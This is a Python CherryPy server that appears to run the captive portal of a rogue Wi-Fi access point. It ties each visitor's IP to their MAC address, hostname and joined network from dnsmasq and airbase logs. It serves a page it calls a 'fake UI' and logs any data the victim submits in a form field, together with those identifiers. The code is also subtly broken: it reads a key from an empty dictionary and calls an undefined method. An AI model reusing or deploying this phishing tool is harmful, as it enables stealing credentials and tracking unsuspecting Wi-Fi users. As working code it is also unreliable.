# coding=UTF-8
import cherrypy
import os
import re
import threading
import time

from mako.template import Template
from mako.lookup import TemplateLookup
lookup = TemplateLookup(directories=['html'],default_filters=['decode.utf8'],input_encoding='utf-8',output_encoding='utf-8')
clients = {}
dataFormID = 'verysecuredata'
infoLock = threading.Lock()
indexBody = None
# coding=UTF-8
class HelloWorld(object):
    def getInfo(self,testip):
        info = {}
        with open("/var/lib/misc/dnsmasq.leases") as f:
            for line in f:
                (expire,mac,ip,name,mac2)=line.split()
                if ip==testip:
                    info={'mac':mac.upper(),'name':name}

        if 'mac' in info:
            MAC = info['mac'].upper()
            p = re.compile("Client "+MAC+' (?:re)?associated.*ESSID:\s+"(.*)"')
            with open("/var/log/airbase.log") as f:
                for line in f:
                    m = p.search(line)
                    if m:
                        info['ssid'] = m.group(1)
                        break
        if len(info)>0:
            return info
        else:
            return None
    @cherrypy.expose
    def rawlog(self):
        with open ("/var/log/cherry_other.log", "r") as myfile:
            data=myfile.read().replace('\n', '<br>')
            return data
    @cherrypy.expose
    def mylog(self):
        #clients['10.20.30.40']  = {}
        #clients['10.20.30.40']['ssid'] = u'привет'
        tmpl = lookup.get_template("log.html")
        sclients = sorted(clients.values(), key=lambda info: info['last'],reverse=True)
        return tmpl.render(clients=sclients)
    @cherrypy.expose
    def mydetails(self, ip):
        tmpl = lookup.get_template("details.html")
        info = {}
        if ip in clients:
            info = clients[ip] 
        return tmpl.render(info=info)
    @cherrypy.expose
    def default(self,*args,**kwargs):
        start = time.time()
        result= self.default_body(*args,**kwargs)
        end = time.time()
        print "measure",end - start
        return result
    def default_body(self,*args,**kwargs):
        global indexBody
        headers =  cherrypy.request.headers
        ip = headers['Remote-Addr']
        agent = headers.get('User-Agent','unk')
        host = headers.get('Host','unk')
        if host=="mymylog":
            return self.mymylog()
        info = {}
        new = False        
        if ip not in clients:
            with infoLock:
                # double check for waiting clients
                if ip not in clients:
                    res = self.getInfo(ip)
                    new=True
                    mac = None 
                    if res:
                        mac = res['mac']
                        clients[mac]=res
                    else:
                        mac="00:00:00:00:00:00"
                        clients[mac]={}
                    clients[mac]['urls'] = []
        mac = info['mac']
        info = clients[mac]
        info['last']=time.time()
        info['ip']=ip
        info['agent']=agent
        mac=info.get('mac','unk')
        name=info.get('name','unk')
        ssid=info.get('ssid','unk')
        url = cherrypy.url()
        print url
        info['urls'].append(url)
        
        if 'client.saw.fake.ui.jpg' in url:
            cherrypy.log("client [%s,%s,%s,%s] saw fake UI" % (mac,name,ip,ssid))
            info['saw'] = True
            return ""
        if new:
            cherrypy.log("client '%s' %s %s %s %s" % (ssid,mac,name,ip,agent))
        if (dataFormID in kwargs):
          data=kwargs[dataFormID]
          info['data']=data
          cherrypy.log("submit: [%s,%s,%s,%s]->%s,agent %s,DATA %s" % (ip,mac,name,ssid,url,agent,data))        
        return indexBody
         
if __name__ == '__main__':
   cherrypy.server.socket_host = "0.0.0.0"
   cherrypy.server.socket_port = 80
   cherrypy.log.access_file="/var/log/cherry_access.log"
   cherrypy.log.error_file="/var/log/cherry_other.log"
   tmpl = lookup.get_template("index.html")
   indexBody = tmpl.render()

   conf = {
         '/': {
             'tools.sessions.on': True,
             'tools.staticdir.root': os.path.abspath(os.getcwd()),

         },
         '/static': {
             'tools.staticdir.on': True,
             'tools.staticdir.dir': './static'
         }
     }
   cherrypy.quickstart(HelloWorld(),'/',conf)
